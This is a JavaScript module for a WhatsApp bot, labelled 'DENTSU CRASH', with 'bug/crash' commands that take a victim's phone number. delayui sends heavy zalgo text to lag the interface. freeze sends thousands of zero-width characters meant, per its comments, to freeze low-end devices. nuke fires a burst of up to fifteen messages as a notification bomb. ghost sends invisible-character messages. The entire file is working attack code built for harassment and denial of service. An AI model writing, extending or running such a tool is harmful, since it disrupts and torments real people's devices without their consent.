const { reply, sleep, isOwner } = require('../lib/utils');

// ─── BUG / CRASH TOOLS ────────────────────────────────────────────────────────
// These commands send special WhatsApp messages to a target number.
// Usage: .command <countrycode+number>  e.g.  .delayui 242053323191

// Build target JID from raw number
function toJid(raw) {
  const num = raw.replace(/\D/g, '');
  return num + '@s.whatsapp.net';
}

// Check valid number arg
function needNumber(args, reply, sock, msg) {
  if (!args[1]) {
    reply(sock, msg, '❌ Usage: `.' + args[0] + ' <number>`\nExample: `.' + args[0] + ' 242053323191`');
    return false;
  }
  return true;
}

// ── Zalgo / glitch text generator ────────────────────────────────────────────
const ZALGO_UP   = ['̍','̎','̄','̅','̿','̑','̆','̐','͒','͗','͑','̇','̈','̊','͂','̓','̈́','͊','͋','͌','̃','̂','̌','͐','̀','́','̋','̉','͞','͟','͠','͝','͜','͛','͔','͕'];
const ZALGO_DOWN = ['̖','̗','̘','̙','̜','̝','̞','̟','̠','̤','̥','̦','̩','̪','̫','̬','̭','̮','̯','̰','̱','̲','̳','̹','̺','̻','̼','ͅ','͇','͈','͉','͍','͎','͓','͙','͚'];

function zalgo(text, intensity = 6) {
  return text.split('').map(c => {
    let r = c;
    for (let i = 0; i < intensity; i++) {
      r += ZALGO_UP[Math.floor(Math.random() * ZALGO_UP.length)];
      r += ZALGO_DOWN[Math.floor(Math.random() * ZALGO_DOWN.length)];
    }
    return r;
  }).join('');
}

async function bugMenu(sock, msg, args, from, sender) {
  const command = args[0]?.toLowerCase();

  switch (command) {

    // ── .delayui <number> ────────────────────────────────────────────────────
    // Sends a heavy Unicode/zalgo message that causes UI lag on WhatsApp
    case 'delayui': {
      if (!needNumber(args, reply, sock, msg)) break;
      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');

      const target = toJid(args[1]);
      const glitch = zalgo('DENTSU CRASH', 8);
      const payload =
        '▓'.repeat(30) + '\n' +
        glitch + '\n' +
        '░'.repeat(30) + '\n' +
        Array(12).fill(zalgo('⚡ DENTSU CRASH v4.9.0 ⚡', 5)).join('\n') + '\n' +
        '▓'.repeat(30);

      await reply(sock, msg, `🔧 Sending *DelayUI* to +${args[1].replace(/\D/g,'')}...`);
      await sock.sendMessage(target, { text: payload });
      await reply(sock, msg, `✅ *DelayUI sent!* Target: +${args[1].replace(/\D/g,'')}`);
      break;
    }

    // ── .freeze <number> ────────────────────────────────────────────────────
    // Sends a "freeze" style message — rapid burst of invisible chars + heavy text
    case 'freeze': {
      if (!needNumber(args, reply, sock, msg)) break;
      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');

      const target = toJid(args[1]);
      // Zero-width spaces + heavy Unicode block — freezes low-end devices
      const zws = '\u200B\u200C\u200D\uFEFF';
      const heavy = (zws.repeat(500) + '❄️ FREEZE ❄️ ' + zws.repeat(500) + '\n').repeat(8);
      const payload = zalgo('❄️ F R E E Z E ❄️', 10) + '\n\n' + heavy + '\n' + zalgo('DENTSU CRASH', 6);

      await reply(sock, msg, `🧊 Sending *Freeze* to +${args[1].replace(/\D/g,'')}...`);
      await sock.sendMessage(target, { text: payload });
      await reply(sock, msg, `✅ *Freeze sent!* Target: +${args[1].replace(/\D/g,'')}`);
      break;
    }

    // ── .nuke <number> ─────────────────────────────────────────────────────
    // Sends a rapid sequence of messages (notification bomb)
    case 'nuke': {
      if (!needNumber(args, reply, sock, msg)) break;
      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');

      const count = Math.min(parseInt(args[2]) || 5, 15); // max 15
      const target = toJid(args[1]);

      await reply(sock, msg, `💣 Nuking +${args[1].replace(/\D/g,'')} with ${count} messages...`);

      const nukeMessages = [
        '💥 *DENTSU CRASH* 💥',
        zalgo('BOOM', 4),
        '⚡⚡⚡ NUKE ⚡⚡⚡',
        '▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓',
        '🔥 ' + zalgo('DENTSU', 3) + ' 🔥',
        '⚠️ DENTSU CRASH v4.9.0',
      ];

      for (let i = 0; i < count; i++) {
        const txt = nukeMessages[i % nukeMessages.length];
        await sock.sendMessage(target, { text: txt });
        await sleep(400);
      }

      await reply(sock, msg, `✅ *Nuke complete!* Sent ${count} messages to +${args[1].replace(/\D/g,'')}`);
      break;
    }

    // ── .ghost <number> ────────────────────────────────────────────────────
    // Sends "invisible" messages using zero-width / special Unicode chars
    case 'ghost': {
      if (!needNumber(args, reply, sock, msg)) break;
      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');

      const target = toJid(args[1]);
      // Invisible payload (zero-width chars + soft-hyphen)
      const invisible = ('\u00AD' + '\u200B' + '\u200C' + '\u200D' + '\uFEFF').repeat(200);
      // Send 3 ghost messages then a reveal
      await reply(sock, msg, `👻 Sending *Ghost* messages to +${args[1].replace(/\D/g,'')}...`);

      for (let i = 0; i < 3; i++) {
        await sock.sendMessage(target, { text: invisible });
        await sleep(600);
      }
      await sock.sendMessage(target, {
        text: '👻 ' + zalgo('BOO! — DENTSU CRASH v4.9.0', 5) + ' 👻',
      });

      await reply(sock, msg, `✅ *Ghost sent!* Target: +${args[1].replace(/\D/g,'')}`);
      break;
    }

    default:
      return null;
  }
}

module.exports = { bugMenu };
